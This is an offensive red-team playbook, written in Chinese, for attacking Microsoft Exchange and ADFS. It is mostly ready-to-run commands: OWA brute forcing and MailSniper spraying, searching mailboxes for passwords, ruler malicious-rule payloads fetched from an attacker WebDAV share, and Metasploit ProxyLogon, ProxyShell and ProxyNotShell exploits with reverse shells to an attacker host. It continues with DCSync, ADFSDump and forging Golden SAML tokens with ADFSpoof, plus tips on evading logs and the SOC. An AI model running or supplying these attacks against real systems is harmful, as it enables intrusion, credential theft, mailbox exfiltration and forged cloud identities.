# Exchange 与 ADFS 攻击面

内网两大身份资产:Exchange 承载全员邮箱与凭据往来,ADFS 是本地 AD 到云(Azure AD/Office 365)的联邦身份网关。Exchange 篇流程:发现指纹(路径/版本头)→ OWA 凭据爆破与 MailSniper 喷洒 → ruler MAPI 规则攻击 → ProxyLogon/ProxyShell/ProxyNotShell/OWASSRF RCE 链 → 域内权限视角(Exchange Trusted Subsystem)。ADFS 篇流程:定位 → 拿 ADFS 服务器 shell → ADFSDump 导出 EncryptedPFX/DKM → DCSync 服务账户 → ADFSpoof 伪造 SAML 令牌 → AADInternals 云侧滥用,附检测/防御对照。命令均可直接复制,占位符用尖括号标注(如 `<Exchange主机>` `<域名>`);bash 块 = 攻击机 Kali,powershell 块 = Windows 落地机(13 号文档武器箱),全部工具参数/函数/模块名以本机实测为准,不虚构。

本文件工具:ruler v2.4.0(`~/tools/bin/ruler`,Windows 侧 `~/tools/windows/ruler.exe`)、MailSniper(`~/tools/src/MailSniper/MailSniper.ps1`,PowerShell)、ADFSpoof/ADFSDump(`~/tools/src/` 下)、AADInternals v0.9.8(`~/tools/src/AADInternals/`)、msfconsole 模块(均 `search` 实测存在)、impacket、BloodHound 固化查询(`~/tools/bin/bh-queries.py`)。凭据与哈希的后续利用见 05,Kerberos 见 12,Windows 落地侧工具见 13,代理配置见 99(curl 走代理:命令前加 `https_proxy=http://<代理IP>:<端口>`)。

---

# Exchange 篇

## 发现与指纹 — 常见路径、版本头与 nmap/http-enum

来源:公开路径与响应头为 Exchange 默认安装事实;nmap 脚本 `/usr/share/nmap/scripts/http-enum.nse` 本机存在(实测)

```bash
# ===== 常见路径速查(443/80,全部默认安装即有)=====
# /owa                Outlook Web App 前端(登录页)
# /ecp                Exchange 管理中心(管理员面板,ProxyLogon 入口)
# /ews                Exchange Web Services(SOAP,MailSniper/ruler 用)
# /autodiscover       自动发现(POST autodiscover.xml,ruler/MailSniper 自动定位)
# /mapi               MAPI/HTTP(ruler 规则攻击走这里)
# /powershell         远程 PowerShell 后端(ProxyShell/ProxyNotShell 的落点)
# /Microsoft-Server-ActiveSync   移动端同步(MailSniper EAS 喷洒)
# /rpc                RPC over HTTP(老版本 Outlook anywhere)
# /oab                离线地址簿
# /aspnet_client      默认空目录——存在即 IIS+典型微软环境(ProxyShell 时代常用探测)

# ===== curl 探测 + 版本指纹 =====
# 探活:301/302 跳转到 /owa/ 即 Exchange;/adfs/ls/ 跳转见 ADFS 篇
curl -sk -o /dev/null -D - https://<Exchange主机>/owa/ | grep -i -E "^HTTP|location|x-owa"
# 版本号在 X-OWA-Version 头(15.2.x=2019 / 15.1.x=2016 / 15.0.x=2013)
curl -sk -o /dev/null -D - https://<Exchange主机>/owa/auth/logon.aspx | grep -i -E "x-owa-version|x-server"
curl -sk -o /dev/null -D - https://<Exchange主机>/ecp/ | grep -i "x-owa-version"
# autodiscover 401+WWW-Authenticate(NTLM/Negotiate)= 活着;后面 ruler/MailSniper 都吃它
curl -sk -o /dev/null -D - -X POST https://<Exchange主机>/autodiscover/autodiscover.xml | grep -i -E "^HTTP|www-authenticate"
# EWS 探活(401 = 端点在)
curl -sk -o /dev/null -w "%{http_code}\n" https://<Exchange主机>/ews/Exchange.asmx

# ===== nmap 目录枚举(http-enum 自带 owa/ecp/autodiscover 特征库)=====
nmap -p 80,443 --script http-enum,http-title --script-args http.useragent='Mozilla/5.0' <Exchange主机或网段>
```

参数速查:
- `X-OWA-Version` 响应头 = 最省事的版本指纹:`15.0`≈2013、`15.1`≈2016、`15.2`≈2019(具体小版本对照微软 CU 列表定补丁状态,决定 RCE 链能不能打)
- `nmap --script http-enum` 特征库认 `/owa` `/ecp` `/autodiscover` `/Microsoft-Server-ActiveSync`;加 `http-title` 顺带取标题
- autodiscover 探测时 `-X POST`(GET 部分版本给 405,POST 才是标准姿势)

注意: 别按网上旧资料直接写 `auxiliary/gather/exchange_web_server_info`——本机 msfconsole `search exchange_web_server_info` 实测无此模块,信息收集用上面 curl+nmap 组合,或 `auxiliary/scanner/msmail/exchange_enum`(实测存在,Exchange 邮箱枚举);版本指纹拿到后先核对是否已打当月 SU(安全更新),已打补丁就别硬打 RCE 链,转凭据路线。

---

## OWA 凭据爆破与喷洒 — msf owa_login / owa_ews_login

来源:msfconsole 6.x 本机实测 `search owa_login`;以下选项为 `use` 后 `show options` 实测输出

```bash
msfconsole -q
# ===== OWA 登录爆破(auxiliary/scanner/http/owa_login)=====
use auxiliary/scanner/http/owa_login
set RHOSTS <Exchange主机>
set USER_FILE /tmp/users.txt          # 用户名字典,一行一个
set PASS_FILE /tmp/pass.txt           # 密码字典
# set USERPASS_FILE /tmp/userpass.txt # 或成对字典:一行"用户 密码"(空格分隔,show options 实测)
# set USER_AS_PASS true               # 用户名当密码试一遍
set STOP_ON_SUCCESS true              # 命中即停(防继续撞锁号)
set THREADS 5
set VHOST mail.<域名>                 # 目标用域名虚拟主机时必设
run
# ===== EWS 侧验证(auxiliary/scanner/http/owa_ews_login,实测存在)=====
use auxiliary/scanner/http/owa_ews_login
set RHOSTS <Exchange主机>
set USERNAME <用户名>
set PASSWORD '<密码>'
run
```

参数速查(owa_login,`show options` 实测):
- `USER_FILE`/`PASS_FILE`/`USERPASS_FILE` 三选一字典组合;`USERNAME`/`PASSWORD` 单点验证
- `ANONYMOUS_LOGIN` 匿名空口令试一把;`USER_AS_PASS` 用户名即密码
- `ENUM_DOMAIN true`(默认)自动用 NTLM 挑战枚举域名/主机名——爆破前就白拿域信息
- `STOP_ON_SUCCESS`/`THREADS`/`BRUTEFORCE_SPEED`(0-5)/`AUTH_TIME`(测认证响应时间差异)
- RPORT 443 + SSL true 默认;`Proxies` 可挂 socks 代理进内网

注意: owa_login 是爆破不是喷洒——一个用户对多密码极易触发锁号;账号锁定策略下优先"多用户×单密码"的喷洒(下一节 MailSniper 或 04 号 spray-safe),且 OWA 侧失败登录一样记 IIS 日志,THREADS 拉高 = 日志里密集 401,红队时段选择同 14 号 MSSQL 篇的 OPSEC 原则。

---

## MailSniper 喷洒与枚举 — Invoke-PasswordSprayOWA / Get-GlobalAddressList(Windows 侧)

来源:~/tools/src/MailSniper/MailSniper.ps1 本机 grep 实测(函数与参数逐个核对);在 Windows 落地机(13 号)PowerShell 运行,先把目录拷过去

```powershell
# ===== 载入 =====
Import-Module .\MailSniper.ps1
# 或 Dot-source:. .\MailSniper.ps1

# ===== OWA 密码喷洒:多用户 × 单密码,防锁号的正确姿势 =====
# ExchHostname 不带 https://,函数自动拼 https://<主机>/owa/
Invoke-PasswordSprayOWA -ExchHostname mail.<域名> -UserList .\users.txt -Password '<喷洒密码>' -Threads 15 -OutFile owa-sprayed-creds.txt
# 用户名带域:字典里写 <域名>\<用户> 或 <用户>@<域名>,或 -Domain <域名> 统一拼
# 同族:Invoke-PasswordSprayEWS(EWS 走 443)/Invoke-PasswordSprayEAS(ActiveSync 端点)——换个认证入口绕盯 OWA 的监控

# ===== 用户名枚举(先确认哪些用户存在,再喷)=====
# OWA 登录页响应时间/报错差异区分用户存在与否
Invoke-UsernameHarvestOWA -ExchHostname mail.<域名> -UserList .\candidates.txt -OutFile harvested.txt
# 域名确认:OWA 页面对 有效域/无效域 的报错不同
Invoke-DomainHarvestOWA -ExchHostname mail.<域名> -Domain <猜的域名>
# EWS 侧:Get-ADUsernameFromEWS;有效凭据后批量找真实邮箱:Invoke-OpenInboxFinder

# ===== 全局地址表 GAL:拿到全员邮箱 = 喷洒字典直接成品 =====
# FindPeople 法(2013+)失败自动退 EWS;ExchangeVersion 对版本:Exchange2010/2013/2013_SP1
Get-GlobalAddressList -ExchHostname mail.<域名> -ExchangeVersion Exchange2013_SP1 -OutFile gal.txt
# 函数完整参数以载入后 Get-Help Get-GlobalAddressList 为准(本机源码核实的参数:ExchHostname/ExchangeVersion/OutFile)
```

参数速查(本机源码 param 块实测):
- `Invoke-PasswordSprayOWA`:`-ExchHostname` `-UserList` `-Password` `-Threads` `-OutFile` `-Domain`
- `Get-GlobalAddressList`:`-ExchHostname` `-ExchangeVersion`(默认 Exchange2010)`-OutFile`
- 本文件函数清单(grep `^function` 实测):`Invoke-GlobalMailSearch` `Invoke-SelfSearch` `Invoke-PasswordSprayOWA/EWS/EAS` `Invoke-UsernameHarvestOWA/EAS` `Invoke-DomainHarvestOWA` `Invoke-OpenInboxFinder` `Get-GlobalAddressList` `Get-ADUsernameFromEWS` `Get-MailboxFolders` `Send-EWSEmail`(O365 变体 `Invoke-GlobalO365MailSearch`)

注意: 喷洒节奏参考 04 号密码攻击篇的锁定窗口策略(错峰、单用户单窗口一次);GAL 枚举本身就是一次 EWS/OWA 登录,留痕在 IIS 与 EWS 日志;Windows 侧执行记得 PowerShell 日志与 AMSI(13 号 OPSEC 节)。

---

## MailSniper 邮件搜索 — Invoke-SelfSearch / Invoke-GlobalMailSearch 挖凭据

来源:MailSniper.ps1 源码 param 块实测;邮箱里最常见的战利品 = 第三方系统密码重置邮件、运维交接的凭据文档

```powershell
# ===== 单账户自查(拿下一个普通邮箱后的第一动作)=====
Invoke-SelfSearch -Mailbox <用户>@<域名> -Terms "*password*","*creds*","*credentials*","*vpn*"
# 完整参数 Get-Help Invoke-SelfSearch(源码核实函数存在;常用姿势如上)

# ===== 管理员全局搜(拿到 Exchange 管理员/委派账户后)=====
# ImpersonationAccount = 冒充的邮箱属主;AdminUserName/AdminPassword = 管理员凭据
Invoke-GlobalMailSearch -ImpersonationAccount <目标用户>@<域名> -ExchHostname mail.<域名> `
    -AdminUserName '<域名>\<管理员>' -AdminPassword '<密码>' `
    -Terms "*password*","*creds*","*credentials*" -MailsPerUser 100 -OutputCsv loot.csv

# ===== 顺手活用 =====
# 按文件夹翻:Get-MailboxFolders;搜到密码后直接用它发钓鱼:Send-EWSEmail
```

参数速查(Invoke-GlobalMailSearch,源码实测):
- `-ImpersonationAccount`(必填)要冒充/搜的邮箱;`-AutoDiscoverEmail` 自动发现替代写法
- `-ExchHostname` `-AdminUserName` `-AdminPassword` 管理侧凭据
- `-Terms` 关键词数组(默认 password/creds/credentials 三件套);`-MailsPerUser 100` 每用户取信数;`-OutputCsv` 落盘

注意: 全局搜索走的是 ApplicationImpersonation 角色的合法委派,Exchange 管理审计里会记委派登录;邮件搜索完别删信,只读不写是底线(删信触发用户感知+诉讼级取证痕迹);搜到的凭据立即分拣:域凭据回 05/12 号流程,第三方凭据单独立账。

---

## ruler 探测与验证 — autodiscover / check / abk

来源:~/tools/bin/ruler v2.4.0(`ruler --help` 实测);MAPI/HTTP 协议,吃 Exchange 2013+ /O365

```bash
# ===== 只跑 autodiscover:确认认证点与协议可达 =====
~/tools/bin/ruler --url https://<Exchange主机>/autodiscover/autodiscover.xml --email <用户>@<域名> -k autodiscover
# 或用域名自动发现(-d 会走 autodiscover.<域名> 等候选)
~/tools/bin/ruler -d <域名> --email <用户>@<域名> -k autodiscover

# ===== check:验证凭据 + 能否实际操作邮箱(ruler 全流程的第一步)=====
~/tools/bin/ruler --url https://<Exchange主机>/autodiscover/autodiscover.xml -u <用户名> -p '<密码>' -k check
# check 成功输出用户 MAPI 能力与邮箱信息;失败会给出原因(凭据/协议/版本)
# 只想看最后谁用过邮箱:--last(取最近一次发件客户端信息,社工参考)
~/tools/bin/ruler --url https://<Exchange主机>/autodiscover/autodiscover.xml -u <用户名> -p '<密码>' -k check --last

# ===== PTH:只有 NT 哈希也能进(注意全局参数是 --hash,单数,不是 --hashes)=====
~/tools/bin/ruler --url https://<Exchange主机>/autodiscover/autodiscover.xml -u <用户名> --hash <NT哈希> -k check

# ===== 通讯录:abk 子命令操作全局地址书(枚举邮箱的 MAPI 路线)=====
~/tools/bin/ruler --url https://<Exchange主机>/autodiscover/autodiscover.xml -u <用户名> -p '<密码>' -k abk
```

参数速查(全局,`ruler --help` 实测):
- 认证:`-u/--username` `-p/--password` `--hash`(NT 哈希 PTH)`-e/--email` `-d/--domain`(支持 `<域名>\<用户>` 写法)
- 定位:`--url <完整autodiscover.xml地址>` 已知入口直接用;`--o365` 目标在 O365 时直连微软;`-k/--insecure` 自签证书必加
- 协议:`--rpc` 强制 RPC/HTTP(默认 MAPI/HTTP);`--noencrypt` 环境要求 RPC 层不加密;`--basic` 强制 Basic 认证;`--admin` 以管理员上下文登录
- 其它:`--proxy <https://ip:port>` 上游代理、`--ua` 自定义 UA、`--verbose/--debug` 排错
- 子命令(实测清单):`check(c)` `add(a)` `delete(r)` `display(d)` `send(s)` `autodiscover(u)` `brute(b)` `abk` `form` `homepage` `search`

注意: `--url` 必须给到 autodiscover.xml 全路径(帮助原文要求完整 URI);check 会在邮箱里留 MAPI 登录记录(HttpProxy 日志),红队把 ruler 的 UA(`--ua "Microsoft Office/16.0"`)改成真实 Outlook 值,别用默认 "ruler" 明晃晃进日志。

---

## ruler 规则攻击与爆破 — add 恶意规则 / send 触发 / brute 撞库

来源:ruler v2.4.0 `add/brute --help` 实测;原理 = 服务端收件规则触发"启动应用程序"(UNC/WEBDAV),Outlook 客户端在线时代可致代码执行,如今常用于钓鱼凭据外带与战术牵制

```bash
RULER() { ~/tools/bin/ruler --url https://<Exchange主机>/autodiscover/autodiscover.xml "$@" -k; }

# ===== 写恶意规则(经典 = 触发词邮件 → 加载 WEBDAV 路径)=====
# location 推荐 WEBDAV:攻击机起 pip install wsgidav && wsgidav -p 80 --auth anonymous(或 13 号 SMB/WEBDAV 姿势)
$RULER -u <用户名> -p '<密码>' add --name 'Outlook 安全更新' \
    --trigger 'patch-notice' \
    --location '\\<攻击机IP>\webdav\evil.ico'
# --send:写完立刻用目标自己的账户给他自己发一封含触发词的邮件,即时引爆
$RULER -u <用户名> -p '<密码>' add --name 'Outlook 安全更新' --trigger 'patch-notice' \
    --location '\\<攻击机IP>\webdav\evil.ico' --send \
    --subject 'PATCH-NOTICE: 待安装更新' --body '自动检查,请忽略'

# ===== 已有规则的查看与清理 =====
$RULER -u <用户名> -p '<密码>' display          # 列出全部规则
$RULER -u <用户名> -p '<密码>' delete --help    # 按名删规则(参数以 --help 实测为准)
$RULER -u <用户名> -p '<密码>' send --help      # 单独补发触发邮件

# ===== 表单/主页攻击(旧版本 Outlook home page 劫持,form/homepage 子命令)=====
$RULER -u <用户名> -p '<密码>' form --help
$RULER -u <用户名> -p '<密码>' homepage --help

# ===== 自动化爆破:autodiscover 侧撞用户名/密码(自带节流防锁)=====
$RULER brute --users /tmp/users.txt --passwords /tmp/pass.txt \
    --attempts 3 --delay 5 --threads 3 --stop -v
# 或 user:pass 成对字典
$RULER brute --userpass /tmp/userpass.txt -a 3 -d 5 -t 3 --stop
```

参数速查:
- `add`:`-n/--name`(规则名,默认 "Delete Spam")`-t/--trigger`(触发词=邮件主题)`-l/--location`(应用路径,WEBDAV UNC)`-s/--send`(写完即触发)`--subject`/`--body`(触发邮件内容)
- `brute`:`-u` 用户字典 `-p` 密码字典 `--userpass` 成对字典;`-a 3` 每 3 次歇 `-d 5`(分钟)节流;`-t` 线程(默认 3,出错就降);`-s/--stop` 命中即停;`-v` 逐条回显
- PTH 同样适用于上述全部:`-p` 换 `--hash <NT哈希>`

注意: 规则只在**目标用 Outlook 桌面端收信时**触发,OWA 网页端不执行"启动应用程序"——目标长期纯 OWA 就别指望 RCE,把规则攻击当"凭据回连探针"用(WEBDAV 一被访问即刻定位目标办公网段);爆破的 `--attempts/--delay` 是防锁号的生命线,默认 3 次/5 分钟别贪;规则打完记得 `display` 核对、`delete` 清理,恶意规则留箱等于给蓝队递报告。

---

## RCE 链之 ProxyLogon — CVE-2021-26855(SSRF)+ 26857/26858/27065

受影响版本:Exchange 2013/2016/2019(2021 年 3 月 SU 之前;2010 不受影响),**无需任何凭据**。

来源:msfconsole 实测存在 `exploit/windows/http/exchange_proxylogon_rce`、`auxiliary/scanner/http/exchange_proxylogon`、`auxiliary/gather/exchange_proxylogon_collector`(选项为 show options 实测)

```bash
msfconsole -q
# ===== 先无害探测:打不打得动(scanner)=====
use auxiliary/scanner/http/exchange_proxylogon
set RHOSTS <Exchange主机>          # RPORT 443 + SSL 默认
set THREADS 10
run
# ===== RCE:SSRF 伪造后端身份 → 写 webshell(excellent)=====
use exploit/windows/http/exchange_proxylogon_rce
set RHOSTS <Exchange主机>
set EMAIL <已知组织邮箱,如用户>@<域名>     # 必填!用来过 autodiscover 定位后端
# set UseAlternatePath true        # 默认路径被锁时改写 IIS 根目录
set TARGET 2                       # 0=PowerShell 1=Dropper 2=Windows Command
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <攻击机IP>
run
# ===== 只想拿数据不下 shell:导邮件/通讯录 =====
use auxiliary/gather/exchange_proxylogon_collector
set RHOSTS <Exchange主机>
set EMAIL <已知组织邮箱>
set ACTION 'Dump Emails'           # 或 'Dump Contacts'
run
```

参数速查:
- `exchange_proxylogon_rce`:`EMAIL` 必填(组织内任一已知邮箱);`UseAlternatePath` 默认写 OWA 前端 auth 目录、true 时改写 IIS 根;TARGET 三选 0/1/2
- `exchange_proxylogon`(scanner):RHOSTS/RPORT/METHOD(默认 POST)/THREADS,纯探测
- `exchange_proxylogon_collector`:ACTION = `Dump Emails` / `Dump Contacts`

手工要点(打不了 msf 时):链路 = CVE-2021-26855 SSRF 把请求伪装成后端可信来源 → 借后端身份吃 CVE-2021-27065(或 26858,均为认证后任意文件写)落 aspx;经典落点 `%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\`(前端可直访)。
善后(离场必做):CVE-2021-26858/27065 写入的 webshell 文件按上述路径逐一删除(`dir /s *.aspx` 核对时间戳),HttpProxy 日志里的 SSRF 痕迹删不掉——打之前就想清楚留痕成本。

注意: 打完 RCE 先查补丁状态再决定横向节奏——2021-03 SU 之后全链失效;EMAIL 填的邮箱会在日志里留下"被冒充"记录,别用管理员的;该链当年被 HAFNIUM 等组织批量利用,目标 SOC 大概率有专项告警,时间窗尽量短。

---

## RCE 链之 ProxyShell — CVE-2021-34473(路径混淆)+ 34523 + 31207

受影响版本:Exchange 2013/2016/2019(2021 年 7 月 CU/SU 之前),**无需凭据**,已知有效邮箱更顺(msf 中 EMAIL 非必填,实测标 no)。

来源:msfconsole 实测存在 `exploit/windows/http/exchange_proxyshell_rce`

```bash
msfconsole -q
use exploit/windows/http/exchange_proxyshell_rce
set RHOSTS <Exchange主机>
set EMAIL <已知邮箱>@<域名>          # 可选:用于 autodiscover 取 LegacyDN,不给也跑
set TARGET 2                         # 0=PowerShell 1=Dropper 2=Windows Command
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <攻击机IP>
run
```

手工要点:链路 = autodiscover.json 路径混淆(CVE-2021-34473,URL 塞 `autodiscover/autodiscover.json?Email=xxx/..` 类绕过)直达后端 Exchange PowerShell → 认证绕过(CVE-2021-34523)→ `New-ManagementRoleAssignment` + `New-MailboxExportRequest` 把任意邮箱导出成文件落到 web 可达路径(CVE-2021-31207 的经典滥用姿势),或直接反序列化 RCE。

善后:MailboxExportRequest 记得 `Remove-MailboxExportRequest`;导出的 pst 与落的文件删净;autodiscover 日志里的 `.json?Email=` 路径混淆特征是铁证,同 ProxyLogon——留痕删不掉,收尾要快。

注意: 与 ProxyLogon 的区别:ProxyShell 无需任何邮箱知识也能起手(EMAIL 只是锦上添花)、入口在 autodiscover+powershell 而非 ecp;两条链都吃 2021 年内补丁,先 `X-OWA-Version` 对 CU 再选链,别把两条全打一遍(双倍告警)。

---

## RCE 链之 ProxyNotShell 与 OWASSRF — CVE-2022-41040(SSRF)+ 41082(反序列化 RCE)

受影响版本:Exchange 2013/2016/2019(2022 年 9 月 SU 之前;微软当时给过 URL 重写临时缓解规则);同一对 CVE 两条入口:ProxyNotShell 走**管理员**后端 PowerShell,OWASSRF 走**普通邮箱用户**的 OWA 认证路径。

来源:msfconsole 实测存在 `exploit/windows/http/exchange_proxynotshell_rce`(USERNAME/PASSWORD 必填,DOMAIN 可选——show options 实测);OWASSRF 无 msf 模块(search 实测无),手工/PoC

```bash
msfconsole -q
# ===== ProxyNotShell:需要一组有效管理员凭据 =====
use exploit/windows/http/exchange_proxynotshell_rce
set RHOSTS <Exchange主机>
set USERNAME <管理员用户>
set PASSWORD '<密码>'
set DOMAIN <域名>                    # 可选
set TARGET 1                         # 0=Dropper 1=Windows Command
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <攻击机IP>
run
```

OWASSRF 手工要点(普通邮箱凭据即可):已认证的 /owa 请求里塞 SSRF(CVE-2022-41040)转打到后端 autodiscover→Exchange PowerShell,再触发 CVE-2022-41082 反序列化;实战标配是落地一个 aspx webshell 再用蚁剑/菜刀类连接器接管——即"OWASSRF + WebShell"打法。落点同 ProxyLogon/ProxyShell 时代(前端可访目录),善后同前两条链:删 shell、核时间戳、评估日志。

同族备案(实测模块在库):`exploit/windows/http/exchange_chainedserializationbinder_rce`(CVE-2021-42321,已认证用户反序列化,2021-11 SU 前)——Exchange 反序列化家族的第四成员,凭据路线 + 版本命中时可作替补链。

注意: 这对 CVE 的临时缓解(IIS URL 重写规则)很多环境装了补丁没删规则、或反之,打之前用手工 SSRF 探测确认缓解是否生效;OWASSRF 的杀伤力在于**任一普通邮箱凭据**即可 RCE——OWA 喷洒(上文)与这条链是天然组合拳;善后别忘了 webshell 的兄弟文件(上传的 zip/日志伪装文件)一起清。

---

## Exchange 域内权限视角 — Trusted Subsystem / Exchange Windows Permissions(接 BloodHound)

来源:组语义为公开事实;固化查询为 ~/tools/redops/bh_queries.json 实测内容(五条 Exchange/ADFS 猎杀查询已在库)

```bash
# ===== 固化查询导入与查看(BloodHound CE 常驻 Saved Queries)=====
~/tools/bin/bh-queries.py                  # 导入(默认 http://127.0.0.1:8080,账密见 redops/bh.json)
~/tools/bin/bh-queries.py --list           # 列出已固化查询名
# BloodHound 界面 → Analysis → Saved Queries:
#   🟣 Exchange 服务器(攻击面入口)        —— 计算机名含 EXCH/MAIL 或属 Exchange 组
#   🟣 Exchange Trusted Subsystem 成员
#   🟣 Exchange Windows Permissions 成员
#   🟣 ADFS 服务器定位
#   🟣 ADFS 服务账户(gMSA/委托)
```

两组的域内含义:
- **Exchange Trusted Subsystem**(通用安全组):成员(= 各 Exchange 服务器)对全部 Exchange 服务器具备本地管理员级控制;拿到该组成员身份或在其成员机上代码执行 ≈ 域内所有 Exchange 服务器沦陷——再叠加上文 RCE 链/邮箱委派,等于全员邮件。BH 固化查询直接给成员链。
- **Exchange Windows Permissions**(通用安全组):对域对象持有高权限 DACL(WriteDacl 类),是经典 ACL 提权起点——在该组(或可写该组成员身份)立足后,给受控账户补 DCSync 权限即直通域控(05/10 号 ACL 提权流程)。

注意: 拿到 Exchange 服务器 SYSTEM 后(任一 RCE 链),先 `whoami /groups` 看这两组成员关系再决定路线:在 Trusted Subsystem → 横向全 Exchange + 找服务账户凭据(mimikatz,13 号);能影响 Windows Permissions → 直接走 ACL 提权夺域,别在邮件服务器上恋战(它一定是 SOC 重点盯防对象)。

---

# ADFS 篇

## ADFS 发现与定位 — 端点探测 + BH 固化查询

来源:ADFS 默认端点为公开事实;BH 查询名实测于 bh_queries.json

```bash
# ===== HTTP 端点探测(443)=====
# /adfs/ls/ 登录端点:200/302 出现 ADFS 登录页即实锤
curl -sk -o /dev/null -w "%{http_code} " https://<目标>/adfs/ls/; echo
# 联合元数据:XML 里直接给 TokenSigning 证书、信赖方、STS 地址(指纹级情报)
curl -sk https://<目标>/FederationMetadata/2007-06/FederationMetadata.xml | head -50
# MEX(WS-Trust):老客户端认证端点
curl -sk -o /dev/null -w "%{http_code}\n" https://<目标>/adfs/services/trust/mex
# nmap http-enum 也能认出 /adfs 目录
nmap -p 443 --script http-enum <目标或网段>
# 云侧反查:登录页跳转到 sts.<域名>/adfs/ls = 该域名与 Azure AD 联邦(Golden SAML 的前提)

# ===== 内网定位:BloodHound 固化查询 =====
~/tools/bin/bh-queries.py --list | grep -i adfs
#   🟣 ADFS 服务器定位      —— 计算机名含 ADFS/STS
#   🟣 ADFS 服务账户(gMSA/委托) —— ADFS/SVC 系账户、SPN/委托属性
```

注意: ADFS 常与 Exchange 同机群暴露(443 网关后面),发现 Exchange 时顺手探一遍 /adfs;FederationMetadata.xml 是无认证可读的,枚举它不留任何登录日志;确认"域名与 Azure AD 联邦"是打 ADFS 的前提——纯本地域没接云,伪造 SAML 无处消费。

---

## ADFS 攻击链(一)— 立足 ADFS 服务器 + ADFSDump 导出 EncryptedPFX/DKM

五步链总览:**① 拿 ADFS 服务器 shell(域凭据横向,05/13 号)→ ② ADFSDump 导出 EncryptedPFX+DKM → ③ DCSync ADFS 服务账户 → ④ ADFSpoof 伪造 SAML 令牌 → ⑤ AADInternals 云侧滥用**。

来源:~/tools/src/ADFSDump(C# 源码,README 实测:VS2017/.NET 4.5 自行编译,不发布二进制);运行条件三条为 README 原文

```powershell
# ===== Windows 侧编译与运行(13 号武器箱流程)=====
# 1. 攻击机/落地机:拷 ~/tools/src/ADFSDump 到 Windows,VS2017+ 打开 ADFSDump.sln → Release → Build
#    (或 csc 方式自行处理依赖;产物 ADFSDump.exe)
# 2. 拷到 ADFS 服务器,以【ADFS 服务账户】上下文运行(任务管理器看 Microsoft.IdentityServer.ServiceHost 进程属主;
#    或 Get-ADFSProperties 查服务账户)——DA 都读不了配置库,只有服务账户可以
# 3. WID(内嵌数据库)环境本地跑;SQL 后端的用 /database 给连接串
.\ADFSDump.exe                                     # 全默认:当前域/当前 DC,输出到 STDOUT
.\ADFSDump.exe /domain:<域名> /server:<域控FQDN>   # 指定域与 DC
# 产物三样(喂给 ADFSpoof 的原料):
#   - DKM 密钥(AD 里查出的容器密钥)
#   - EncryptedPFX(token signing 证书对的加密 blob)
#   - 全部信赖方(RP)信息:RP 标识/签名算法/签发规则
```

参数速查(ADFSDump.exe,README 实测):`/domain:` 域 `/server:` 域控 `/nokey` 不输出 DKM `/database:"<SQL连接串>"` SQL 后端 `/username:` `/password:` 指定运行身份。

注意: ADFSDump 必须在 **ADFS 服务器本体**(不是 WAP 代理)上以**服务账户**跑——先解决"shell + 进程属主"再谈导出;输出直接进屏幕/文件,别留在服务器上(导完即删);只跑在 WID 上是默认假设,SQL 后端环境记得换 /database,否则导不出。

---

## ADFS 攻击链(二)— DCSync ADFS 服务账户拿 DKM 原料

来源:impacket(/usr/bin/impacket-secretsdump);原理 = ADFS 配置库里 EncryptedPFX 的加密密钥(DKM)存在 AD 中,服务账户对象可读,DCSync 即可取

```bash
# ===== 标准 DCSync 单账户(需要 DA/复制权,05/10 号)=====
impacket-secretsdump '<域名>/<域管>:<密码>@<域控FQDN>' -just-dc-user <ADFS服务账户名>
# 例:svc_adfs 普通账户 / gMSA 账户名带 $(名称以 gMSA 结尾时照抄全名)
impacket-secretsdump '<域名>/<域管>:<密码>@<域控FQDN>' -just-dc-user svc_adfs
impacket-secretsdump '<域名>/<域管>:<密码>@<域控FQDN>' -just-dc-user 'svc_adfs$'
# 哈希版登录:
impacket-secretsdump -hashes :<NT哈希> '<域名>/<域管>@<域控FQDN>' -just-dc-user <ADFS服务账户名>
# ===== gMSA 明文密码路线(有读取权限时,12 号 §7)=====
python3 ~/tools/src/gMSADumper/gMSADumper.py -u <用户> -p '<密码>' -d <域名> -l <域控IP>
```

要点:这一步拿的不是"登录哈希"而是 **DKM 解密材料**(服务账户属性里的密钥数据)——与第①步 ADFSDump 导出的 EncryptedPFX 配对,才能解开 token-signing 证书;顺序上也可以只 DCSync + 远程读配置库(免 shell),但 ADFSDump 在机导出最省事。

注意: DCSync 打域控 = 4662 复制事件直接落 DC 安全日志(见检测节),这是五步链里蓝队最易捕获的一环,节流:一次取够,别反复拉;`-just-dc-user` 限定单账户,别全量 `-just-dc`(动静完全两个量级)。

---

## ADFS 攻击链(三)— ADFSpoof 伪造 SAML 令牌(Golden SAML)

来源:~/tools/src/ADFSpoof(mandiant)实测;**本机依赖现状(实测)**:pycryptodomex 3.20.0 已装,但系统 cryptography 49.0.0 与 requirements.txt(cryptography==2.9.2)不兼容,直接运行报 `AttributeError: module 'cryptography.utils' has no attribute 'register_interface'`——先建 venv 按仓库锁版本再跑

```bash
# ===== 一次性环境(venv 隔离,不动系统库)=====
python3 -m venv ~/tools/venvs/adfs
~/tools/venvs/adfs/bin/pip install -r ~/tools/src/ADFSpoof/requirements.txt
# ===== 伪造 O365 令牌:EncryptedPFX+DKM 解密 → 签发目标用户断言 =====
~/tools/venvs/adfs/bin/python ~/tools/src/ADFSpoof/ADFSpoof.py \
    -b '<EncryptedPFX blob>' '<DKM 密钥>' \
    -s sts.<域名> \
    o365 --upn <目标用户>@<域名> --objectguid <目标用户objectGUID>
# -s = 联邦服务标识(通常 sts.<域名>,不带 https://;对照 FederationMetadata 里的 EntityID)
# --upn/--objectguid 均必填;objectGUID 从 AD 查:GetADUser <用户> -Properties objectguid
# ===== 变体 =====
# 已有签名证书(非加密 blob):-c <cert.pfx> -p '<证书密码>' 同上
# 通用 SAML 目标(非 O365 信赖方):saml2 --endpoint <ACS地址> --nameid <用户> --rpidentifier <RP标识> --assertions '<XML>'
# 只导出解密后的签名证书:dump --path token.pfx
# 产物 = 完整签名的 SAML 断言 XML → 按联盟域 SAML 流程提交到 Azure AD 登录端点,换目标用户云会话
```

参数速查(源码 add_argument 实测):`-b <blob> <key>`(EncryptedPFX+DKM)/`-c <cert>`+`-p` 备选;`-s` 联邦服务名;`-a rsa-sha256`/`-d sha256` 签名与摘要算法;`--assertionid`/`--responseid` 自定义 ID;`-o` 断言落盘;子模块 `o365`(--upn --objectguid 必填)/`dropbox`(--email --accountname)/`saml2`(通用)/`dump`。

